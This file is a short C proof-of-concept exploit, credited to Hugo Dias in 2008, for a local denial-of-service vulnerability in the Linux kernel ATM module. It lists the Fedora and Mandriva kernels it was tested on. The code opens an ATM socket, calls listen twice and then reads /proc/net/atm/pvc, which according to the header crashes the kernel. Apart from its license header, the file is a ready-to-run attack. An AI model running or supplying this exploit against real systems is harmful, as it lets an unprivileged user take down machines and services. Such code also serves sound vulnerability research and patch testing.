/*
   Copyright (C) 2008  Hugo Dias - hdias [at] synchlabs [dot] com

   Linux Kernel 'atm module' Local Denial of Service Vulnerability

	 http://www.synchlabs.com/advisories/200810-2.htm

   Tested on: Fedora Core 10  - 2.6.25-14.fc9.i686
   Fedora Core 9   - 2.6.25-14.fc9.x86_64 #1 SMP
   Fedora Core 9   - 2.6.25-14.fc9.i686 
   Mandriva 2009.0 - 2.6.27-desktop-0.rc8.2mnb #1 SMP
   						

   This program is free software: you can redistribute it and/or
   modify it under the terms of the GNU General Public License as
   published by the Free Software Foundation, either version 3 of the
   License, or (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program. If not, see <http://www.gnu.org/licenses/>.  

*/

#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
  /*
    It will request the module atm, if not loaded 
  */ 
  int fd = socket(PF_ATMSVC, 0, 37);
  
  listen(fd, 7);
  listen(fd, 2);
   
  system("/bin/cat /proc/net/atm/pvc"); 
}